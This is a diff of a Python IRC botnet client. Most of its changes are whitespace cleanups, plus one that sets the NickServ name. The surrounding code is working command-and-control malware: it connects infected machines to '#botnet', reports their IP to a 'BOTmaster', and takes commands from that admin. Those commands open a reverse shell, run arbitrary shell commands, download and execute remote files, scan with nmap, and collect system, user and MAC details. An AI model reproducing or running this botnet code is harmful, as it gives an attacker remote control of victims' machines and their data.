@@ -67,7 +67,7 @@ channel = "#botnet" # Channel to join on connect.
 #botnick = "ip" + ip.replace(".", "_") # Set bots nick to IP address, but in proper IRC nick compatible format.
 botnick = "abot["+ str(random.randint(10000,99999)) +"]" # Set bots IRC Nick to abot + 5 random numbers.
 # nspass = "password" # Bots NickServ password.
-# nickserv = "NickServ" # Nickname service name. (sometimes it's differnet on some networks.)
+nickserv = "Localnet" # Nickname service name. (sometimes it's differnet on some networks.)
 adminname = "BOTmaster" # Bot Master's IRC nick.
 exitcode = "bye" # Command 'exitcode + botnick' is used to kill the bot.
 #################################################
@@ -120,7 +120,7 @@ def reconnect():
         ircsock.close() # Close previous socket.
         ircsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # Set ircsock variable.
         if usessl: # If SSL is True, connect using SSL.
-            ircsock = ssl.wrap_socket(ircsock) 
+            ircsock = ssl.wrap_socket(ircsock)
         try:
             if debugmode: # If debugmode is True, msgs will print to screen.
                 print("Reconnecting to " + str(server) + ":" + str(port))
@@ -128,7 +128,7 @@ def reconnect():
             if usesasl:
                 ircsend("CAP REQ :sasl") # Request SASL Authentication.
                 if debugmode:
-                    print("Requesting SASL login.")            
+                    print("Requesting SASL login.")
             if useservpass: # If useservpass is True, send serverpass to server to connect.
                 ircsend("PASS "+ serverpass) # Send the server password to connect to password protected IRC server.
             ircsend("USER "+ botnick +" "+ botnick +" "+ botnick +" "+ botnick +" "+ botnick) # We are basically filling out a form with this line and saying to set all the fields to the bot nickname.
@@ -142,7 +142,7 @@ def reconnect():
             connected = False
             time.sleep(10)
             reconnect()
-            
+
 def joinchan(chan): # Join channel(s).
     ircsend("JOIN "+ chan)
     ircmsg = ""
@@ -154,11 +154,11 @@ def joinchan(chan): # Join channel(s).
 
 def partchan(chan): # Part channel(s).
     ircsend("PART "+ chan)
-        
-def pjchan(chan): # Part then Join channel(s) 
+
+def pjchan(chan): # Part then Join channel(s)
     ircsend("PART "+ chan)
     ircsend("JOIN "+ chan)
-    
+
 def newnick(newnick): # Change botnick.
     ircsend("NICK "+ newnick)
 
@@ -167,14 +167,14 @@ def sendmsg(msg, target=channel): # Sends messages to the target.
 
 def sendntc(ntc, target=channel): # Sends a NOTICE to the target.
     ircsend("NOTICE "+ target +" :"+ ntc)
-    
+
 def sendversion(nick, ver): # Respond to VERSION request.
     ver = "VERSION " + software + ' ' + version + ' Download it at: ' + github
     sendntc(ver, nick)
-    
+
 def kick(msg, usr, chan): # Kick a user from the channel.
     ircsend("KICK "+ chan + " " + usr + " :"+ msg)
-    
+
 def uptime(): # Used to get current uptime for .uptime command
     delta = datetime.timedelta(seconds=round((datetime.datetime.utcnow() - starttime).total_seconds()))
     return delta
@@ -241,7 +241,7 @@ def rShell(rsHost, rsPort): # Open a reverse shell on this device.
         if debugmode:
             print("rShell Socket Connection Exception: " + str(rsconnex))
     rs.close()
-    
+
 def runcmd(sc): # Run shell commands on this device.
     proc = subprocess.Popen(shlex.split(sc), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
     while True:
@@ -261,13 +261,13 @@ def runcmd(sc): # Run shell commands on this device.
         print(pp)
     sendntc(pp, adminname)
     sendntc("Shell> Done.", adminname)
-    
+
 def runcmd_noout(sc): # Run shell commands with any feedback output.
     proc = subprocess.Popen(sc, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
 
 def setmode(flag, target=channel): # Sets given mode to nick or channel.
     ircsend("MODE "+ target +" "+ flag)
-    
+
 def download(link, file): # Download a file.
     urllib.request.urlretrieve(str(link), str(file))
     sendntc(str(file) +" was successfully downloaded from "+ str(link) +"!", adminname)
@@ -279,7 +279,7 @@ def execute(xType, file): # Run executable file.
         os.system(str(file))
     else:
         runcmd_noout('./'+ file)
-    
+
 def update(link, file): # Update bot.
     download(link, file)
     runcmd_noout('./' + file)
@@ -369,7 +369,7 @@ def main():
         ircmsg = ircmsg.strip('\n\r')
         if debugmode: # If debugmode is True, msgs will print to screen.
             print(ircmsg) # Print messages to the screen. (won't allow bot to run in the background.)
-        
+
         # SASL Authentication.
         if ircmsg.find("ACK :sasl") != -1:
             if usesasl:
@@ -388,7 +388,7 @@ def main():
                 if debugmode:
                     print("Sending CAP END command.")
                 ircsend("CAP END") # End the SASL Authentication.
-        
+
         # Wait 30 seconds and try to reconnect if 'too many connections from this IP'
         if ircmsg.find('Too many connections from your IP') != -1:
             if debugmode: # If debugmode is True, msgs will print to screen.
@@ -396,12 +396,12 @@ def main():
             connected = False
             time.sleep(30)
             reconnect()
-        
+
         # Change nickname if current nickname is already in use.
         if ircmsg.find('Nickname is already in use') != -1:
             botnick = "abot" + str(random.randint(10000,99999))
             newnick(botnick)
-        
+
         # Join 'channel' and msg 'admin' after you are fully connected to server.
         if ircmsg.find('NOTICE') != -1:
             name = ircmsg.split('!',1)[0][1:]
@@ -410,17 +410,17 @@ def main():
                 #sendmsg("IDENTIFY %s" % nspass, nickserv)
                 joinchan(channel)
                 sendntc(format(ip) + " Online!", adminname)
-                
+
             # Respond to NickServ ident request.
             if name.lower() == nickserv.lower() and message.find('This nickname is registered') != -1:
                 sendmsg("IDENTIFY " + nspass, nickserv)
-                
+
         # Respond to CTCP VERSION
         if ircmsg.find('VERSION') != -1:
             name = ircmsg.split('!',1)[0][1:]
             vers = version
             sendversion(name, vers)
-            
+
         # Messages come in from IRC in the format of: ":[Nick]!~[hostname]@[IPAddress]PRIVMSG[channel]:[message]"
         if ircmsg.find('PRIVMSG') != -1:
             name = ircmsg.split('!',1)[0][1:]
@@ -453,7 +453,7 @@ def main():
                         target = name
                         message = "Could not parse. The message should be in the format of '.notice [target] [message]' to work properly."
                     sendntc(message, target)
-                
+
                 # Respond to '.kick [channel] [nick] [reason]' command from admin.
                 if name.lower() == adminname.lower() and message[:5].find('.kick') != -1:
                     target = message.split(' ', 1)[1]
@@ -466,7 +466,7 @@ def main():
                     else:
                         message = "Could not parse. The message should be in the format of '.kick [#channel] [nick] [reason]' to work properly."
                     sendntc(message, name)
-                
+
                 # Respond to the '.mode [target] [mode]' command from admin.
                 if name.lower() == adminname.lower() and message[:5].find('.mode') != -1:
                     target = message.split(' ', 1)[1]
@@ -478,7 +478,7 @@ def main():
                     else:
                         message = "Could not parse. The message should be in the format of '.mode [target] [mode]' to work properly."
                     sendntc(message, adminname)
-                
+
                 # Respond to the '.dl [url] [file]' command from admin.
                 if name.lower() == adminname.lower() and message[:5].find('.dl') != -1:
                     target = message.split(' ', 1)[1]
@@ -490,7 +490,7 @@ def main():
                     else:
                         message = "Could not parse. The message should be in the format of '.dl [url] [file]' to work properly."
                     sendntc(message, adminname)
-                               
+
                 # Respond to the '.run [execute type] [executable file]' command from admin.
                 if name.lower() == adminname.lower() and message[:5].find('.run') != -1:
                     target = message.split(' ', 1)[1]
@@ -502,7 +502,7 @@ def main():
                     else:
                         message = "Could not parse. The message should be in the format of '.run [exec type] [exec file]' to work properly."
                     sendntc(message, adminname)
-                
+
                 # Respond to the '.raw [command]' command from admin.
                 if name.lower() == adminname.lower() and message[:5].find('.raw') != -1:
                     if message.split(' ', 1)[1] != -1:
@@ -512,7 +512,7 @@ def main():
                     else:
                         message = "Could not parse. The message should be in the format of '.raw [command]' to work properly."
                     sendntc(message, adminname)
-                
+
                 # Respond to the '.nick [newnick]' command from admin.
                 if name.lower() == adminname.lower() and message[:5].find('.nick') != -1:
                     if message.split(' ', 1)[1] != -1:
@@ -522,7 +522,7 @@ def main():
                     else:
                         message = "Could not parse. Please make sure the command is in the format of '.nick [newnick]' to work properly."
                     sendntc(message, name)
-                
+
                 # Respond to the '.join [channel]' command from admin.
                 if name.lower() == adminname.lower() and message[:5].find('.join') != -1:
                     if message.split(' ', 1)[1].startswith('#'):
@@ -532,7 +532,7 @@ def main():
                     else:
                         message = "Could not parse. Please make sure the channel is in the format of '#channel'."
                     sendntc(message, name)
-                
+
                 # Respond to the '.part [channel]' command from admin.
                 if name.lower() == adminname.lower() and message[:5].find('.part') != -1:
                     if message.split(' ', 1)[1].startswith('#'):
@@ -552,7 +552,7 @@ def main():
                     else:
                         message = "Could not parse. Please make sure the channel is in the format of '#channel'."
                     sendntc(message, name)
-                
+
                 # Respond to the '.help' command.
                 if message.find('.help') != -1:
                     message = "End of Help."
@@ -597,28 +597,28 @@ def main():
                     for line in helpmsg:
                         sendntc(line, name)
                     sendntc(message, name)
-                
+
                 # Respond to '.ip' command from admin.
                 if name.lower() == adminname.lower() and message.find('.ip') != -1:
                     ip = get('https://api.ipify.org').text
                     sendntc("My public ip address is: " + format(ip), name)
-                
+
                 # Respond to '.uptime' command from admin.
                 if name.lower() == adminname.lower() and message.find('.uptime') != -1:
                     sendntc("My current uptime: " + format(uptime()), name)
-                    
+
                 # Respond to '.uname' command from admin.
                 if name.lower() == adminname.lower() and message.find('.uname') != -1:
                     sendntc("System Info: " + format(uname()), adminname)
-                    
+
                 # Respond to '.username' command from admin.
                 if name.lower() == adminname.lower() and message.find('.username') != -1:
                     sendntc("Username: " + format(username()), adminname)
-                    
+
                 # Respond to '.macaddress' command from admin.
                 if name.lower() == adminname.lower() and message.find('.macaddress') != -1:
                     sendntc("Mac Address: " + format(macaddress()), adminname)
-                    
+
                 # Respond to '.sysinfo' command from admin.
                 if name.lower() == adminname.lower() and message.find('.sysinfo') != -1:
                     # System
@@ -633,11 +633,11 @@ def main():
                     sendntc("Architecture: " + format(platform.architecture()[0]), adminname)
                     # Machine
                     sendntc("Machine: " + format(platform.machine()), adminname)
-                    
+
                 # Respond to '.osversion' command from admin.
                 if name.lower() == adminname.lower() and message.find('.osversion') != -1:
                     sendntc("OS Version: " + format(platform.version()), adminname)
-                    
+
                 # Respond to '.memory' command from admin.
                 if name.lower() == adminname.lower() and message.find('.memory') != -1:
                     if platform.system() == 'Linux':
@@ -646,7 +646,7 @@ def main():
                     else:
                         message = "Only Linux is currently supported."
                     sendntc(message, name)
-                                
+
                 # Respond to '.upgrade [link] [file]' command from admin.
                 if name.lower() == adminname.lower() and message.find('.upgrade') != -1:
                     target = message.split(' ', 1)[1]
@@ -658,7 +658,7 @@ def main():
                     else:
                         message = "Could not parse. The command should be in the format of '.update [link] [file]' to work properly."
                     sendntc(message, adminname)
-                               
+
                 # Respond to '.scan [target] [port(s)]' command from admin.
                 if name.lower() == adminname.lower() and message[:5].find('.scan') != -1:
                     target = message.split(' ', 1)[1]
@@ -666,7 +666,7 @@ def main():
                         message = "nmap scan has completed!"
                         ports = target.split(' ', 1)[1]
                         target = target.split(' ')[0]
-                        ports = [s.strip() for s in str(ports).split(',')] 
+                        ports = [s.strip() for s in str(ports).split(',')]
                         for port in ports: # loops through comma seperated list of ports.
                             nmapScan(target, port)
                     else:
@@ -687,7 +687,7 @@ def main():
                         sendntc(message, adminname)
                     else:
                         sendntc("Shell commands are disabled!", adminname)
-                
+
                 # Respond to '.fsdl [target] [port]' command from admin.
                 if name.lower() == adminname.lower() and message[:5].find('.fsdl') != -1:
                     fileServer()
@@ -704,7 +704,7 @@ def main():
                         sendntc(message, adminname)
                     else:
                         sendntc("Shell commands are disabled!", adminname)
-                
+
                  # Respond to '.cno [shell command]' command from admin.
                 if name.lower() == adminname.lower() and message[:5].find('.cno') != -1:
                     if enableshell:
@@ -717,7 +717,7 @@ def main():
                         sendntc(message, adminname)
                     else:
                         sendntc("Shell commands are disabled!", adminname)
-                
+
                # Respond to 'exitcode botnick' from admin.
                 if name.lower() == adminname.lower() and message.rstrip() == exitcode + " " + botnick:
                     sendmsg("Okay, Bye!")
@@ -734,21 +734,21 @@ def main():
                         print('PING time exceeded threshold')
                     connected = False
                     reconnect()
-                
+
             if not ircmsg: # If no response from server, try and reconnect.
                 if debugmode: # If debugmode is True, msgs will print to screen.
                     print('Disconnected from server')
                 connected = False
                 reconnect()
-                
+
 try: # Here is where we actually start the Bot.
     if not connected:
         #srtChk() # Check if file exists.
         connect() # Connect to server.
-    
+
 except KeyboardInterrupt: # Kill Bot from CLI using CTRL+C
     ircsend("QUIT Terminated Bot using [ctrl + c]")
     if debugmode: # If debugmode is True, msgs will print to screen.
         print('... Terminated Bot using [ctrl + c], Shutting down!')
     sys.exit()
-    
+
